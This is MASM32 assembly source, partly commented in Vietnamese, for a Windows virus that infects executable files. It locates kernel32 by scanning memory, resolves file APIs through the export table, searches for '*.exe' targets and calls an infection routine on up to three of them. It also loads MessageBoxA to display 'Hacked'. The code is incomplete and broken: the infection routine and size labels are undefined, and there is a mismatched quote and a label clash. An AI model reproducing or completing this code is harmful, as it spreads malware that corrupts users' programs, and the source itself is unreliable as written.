.386                   ; For 80386 CPUs or higher.
.model flat, stdcall   ; Windows is always the 32-bit FLAT model

option casemap:none    ; Masm32 will use case-sensitive labels.

.data 
 tMessageBoxA                 db                 'MessageBoxA", 0
 vMessageBoxA                 dd                 00000000h

@Names				label	byte
tGetProcAddress		db	"GetProcAddress", 0
tLoadLibraryA			db	"LoadLibraryA", 0
tExitProcess			db	"ExitProcess", 0
tGetWindowsDirectoryA		db	"GetWindowsDirectoryA", 0
tGetSystemDirectoryA		db	"GetSystemDirectoryA", 0
tGetCurrentDirectoryA		db	"GetCurrentDirectoryA", 0
tSetCurrentDirectoryA		db	"SetCurrentDirectoryA", 0
tFindFirstFileA		db	"FindFirstFileA", 0
tFindNextFileA			db	"FindNextFileA", 0
tFindClose			db	"FindClose", 0
tGlobalAlloc			db	"GlobalAlloc", 0
tGlobalFree			db	"GlobalFree", 0
tGetFileAttributesA		db	"GetFileAttributesA", 0
tSetFileAttributesA		db	"SetFileAttributesA", 0
tCreatFileA			db	"CreateFileA", 0
tReadFile			db	"ReadFile", 0
tWriteFile			db	"WriteFile", 0
tGetFileTime			db	"GetFileTime",0
tGetFileSize			db	"GetFileSize", 0
tCreateFileMapping		db	"CreateFileMapping", 0
tCloseHandle			db	"CloseHandle", 0
tSetFilePointer	       db	"SetFilePointer", 0
tSetEndOfFile			db	"SetEndOfFile", 0
				db	0FFh


@Offsets			label	byte
vGetProcAddress		dd	00000000h			
vLoadLibraryA			dd	00000000h
vExitProcess			dd	00000000h
vGetWindowsDirectoryA		dd	00000000h
vGetSystemDirectoryA		dd	00000000h
vGetCurrentDirectoryA		dd	00000000h
vSetCurrentDirectoryA		dd	00000000h
vFindFirstFileA		dd	00000000h
vFindNextFileA			dd	00000000h
vFindClose			dd	00000000h
vGlobalAlloc			dd	00000000h
vGlobalFree			dd	00000000h
vGetFileAttributesA		dd	00000000h
vSetFileAttributesA		dd	00000000h
vCreateFileA			dd	00000000h
vReadFile			dd	00000000h
vWriteFile			dd	00000000h
vGetFileTime			dd	00000000h
vGetFileSize			dd	00000000h
vCreateFileMapping		dd	00000000h
vCloseHandle			dd	00000000h
vSetFilePointer		dd	00000000h
vSetEndOfFile			dd	00000000h


vKernel32			dd	00000000h
Counter				dd	00000000h
SearchHandle			dd	00000000h
FileHandle			dd	00000000h
FilePointer			dd	00000000h
OriginalFileTime		dd	00000000h
FileAttribute			dd	00000000h
MemoryHandle			dd	00000000h
NewFileSize			dd	00000000h
PEHeader			dd	00000000h
InfectFlag			dd	00000000h
OriFileSize			dd	00000000h
TEST1				dd 	00000000h
ORIGINAL			dd 	00000000h
ByteRead			dd	?

User32Dll			db	"User32.dll", 0			;User32.dll
WindowsDir			db	128h dup (0)
SystemDir			db	128h dup (0)
CurrentDir                   db     128h dup (0)
Mark				db	"*.exe", 0			;target file *.exe

total_size			equ	(offset VirusEnd - offset VirusStart)


szTopic				db	"Hello World", 0
szText				db	"Hacked", 0


max_path			equ	260
MinimumFileSize		equ	1024d

.code
Start:

filetime		STRUC						;file time structure
			FT_dwLowDateTime	DD ?	
			FT_dwHighDateTime	DD ?
filetime		ENDS	

win32_find_data                 STRUC             
         FileAttributes          DD ?              			; attributes
         CreationTime            filetime <>        			; time of creation
         LastAccessTime          filetime <>        			; last access time
         LastWriteTime           filetime <>        			; last modificationm
         FileSizeHigh            DD ?              			; filesize
         FileSizeLow             DD ?              			; -"-
         Reserved0               DD ?              			;
         Reserved1               DD ?              			;
         FileName                DB max_path DUP (?) 			; long filename
         AlternateFileName       DB 13 DUP (?)     			; short filename
                                 DB 3 DUP (?)      			; dword padding
 win32_find_data                 ENDS              			;
                                                   			;
 Win32FindData    win32_find_data <>                			; our search area


call delta
delta:
 pop ebp
 sub ebp, offset delta
 mov esi, [esp]
 and esi, 0FFFF0000h

 call Getkernal32
 mov dword ptr [ebp+offset vKernel32], eax    ;luu dia chi kernel32.dll

 lea edi, [ebp+offset @Offsets]
 lea esi, [ebp+offset @Names]
 call GetApis
 call AdMess
 call  DirScan 

;-----------------------------------------
;DirScan:
;-----------------------------------------

lea eax, [ebp+offset CurrentDir]
push eax
push 128h
mov eax, [ebp+offset vGetCurrentDirectoryA]
call eax

lea eax, [ebp+offset CurrentDir]
push eax
mov eax, [ebp+offset vSetCurrentDirectoryA]
call eax
mov dword ptr [ebp+offset Counter],3
call SearchFiles

ret

;------------------------------------------
;Search 3 files 
;------------------------------------------
SearchFiles:
 push ebp
 lea eax, dword ptr [ebp+offset Win32FindData]
 push eax
 lea eax, [ebp+offset Mark]
 push eax
 call [ebp+offset vFindFirstFileA]
 pop ebp

 inc eax
 jz SearchClose
 dec eax
 mov dword ptr [ebp+offset SearchHandle],eax
 mov esi, offset Win32FindData.FileName
 add esi, ebp
 mov dword ptr [ebp+offset FilePointer],esi

 cmp [Win32FindData.FileSizeHigh+ebp],0
 jne SearchNext

mov ecx, [Win32FindData.FileSizeLow+ebp]
mov dword ptr [ebp+offset NewFileSize], ecx
mov dword ptr [ebp+offset OriFileSize], ecx
call InfectFiles

dec dword ptr [ebp+offset Counter]
cmp dword ptr [ebp+offset Counter], 0
je SearchHandleClose

SearchNext:
 push ebp
 lea eax, dword ptr [ebp+offset Win32FindData]
 push eax
 mov eax, dword ptr [ebp+offset SearchHandle]
 push eax
 call [ebp+offset vFindNextFileA]
 pop ebp

 cmp eax, 0
 je SearchHandleClose

 mov esi, offset Win32FindData.FileName
 add esi, ebp
 mov dword ptr [ebp+offset FilePointer], esi		;esi=File Pointer
	
 cmp [Win32FindData.FileSizeHigh+ebp], 0
 jne SearchNext
	
 mov ecx, [Win32FindData.FileSizeLow+ebp]		;ecx=File Size
 mov dword ptr [ebp+offset NewFileSize], ecx	 	;save it
 mov dword ptr [ebp+offset OriFileSize], ecx
 call InfectFiles
	
 dec dword ptr [ebp+offset Counter]			;Counter - 1
 cmp dword ptr [ebp+offset Counter], 0
 jne SearchNext

SearchHandleClose:
 push dword ptr [ebp+offset SearchHandle]
 mov eax, [ebp+offset vFindClose]
 call eax
 cmp eax, 0
 je SearchClose

SearchClose:
 ret


 


;--------------------------------------------
;Tim kernal32
;--------------------------------------------
Getkernal32 PROC

findkernal32:
 cmp word ptr [esi], "ZM"
 je  K32Found
 sub esi, 10000h
 jmp findkernal32

K32Found:
 mov eax, esi
 ret

Getkernal32 endp

;---------------------------------------
;GetApis
;---------------------------------------

GetApis PROC
step1:
 mov eax, dword ptr [ebp + vKernel32]
 push esi
 push edi
 call GetApi
 pop edi
 pop esi

 mov [edi], eax
 add edi, 4

step2:
 inc esi
 cmp byte ptr [esi], 0
 jne step2
 inc esi
 cmp byte ptr [esi], 0FFh           ;ket thuc chuoi
 jnz step1
 ret

GetApis endp

;---------------------------------------------
;GetApi
;-----------------------------------------------

GetApi PROC
 mov ebx, [eax+3ch]             ;offset of PE header
 add ebx, eax                   ; dia chi that PE header
 mov ebx, [ebx+78h]             ;ExportDirectory Virtual Address
 add ebx, eax                   ;dia chi ExportDirectory

 xor edx, edx                   ;edx = 0
 mov ecx, [ebx+20h]             ;dia chi AddressOfNames
 add ecx, eax                   ;dia chi that
 push esi
 push edx

NextApi:
 pop edx
 pop esi
 inc edx                         ;index
 mov edi, [ecx]                  ;dia chi that
 add ecx, 4                      ;ham tiep theo
 push esi
 push edx

CompareApi:
 mov dl, [edi]                   
 mov dh, [esi]
 cmp dl, dh
 jne NextApi 
 inc edi
 inc esi
 cmp byte ptr [esi], 0
 je GetAddr
 jmp CompareApi

GetAddr:
	pop edx
	pop esi
	dec edx						;edx-1 (because edx=index point to zero -finish)
	shl edx, 1						;edx=edx*2
	
	mov ecx, [ebx+24h]
	add ecx, eax
	add ecx, edx					;ecx=ordinals
	
	xor edx,edx
	mov dx, [ecx]
	shl edx, 2						;edx=edx*4
	mov ecx, [ebx+1ch]					;ecx=RVA AddressOfFunctions
	add ecx, eax					;normalize
	add ecx, edx						
	add eax, [ecx]					;eax=address of API function we looking for 
	ret
	
GetApi	endp

;------------------------------
;call special API
;------------------------------
Admess proc
 mov eax, offset User32Dll
 add eax, ebp
 push eax 
 mov eax, dword ptr [ebp + offset vLoadLibraryA]
 call eax

mov esi, offset tMessageBoxA
add esi, ebp
push esi
push eax
mov eax, dword ptr [ebp + offset vGetProcAddress]
call eax

mov dword ptr [ebp+offset vMessageBoxA], eax
ret

Admess endp



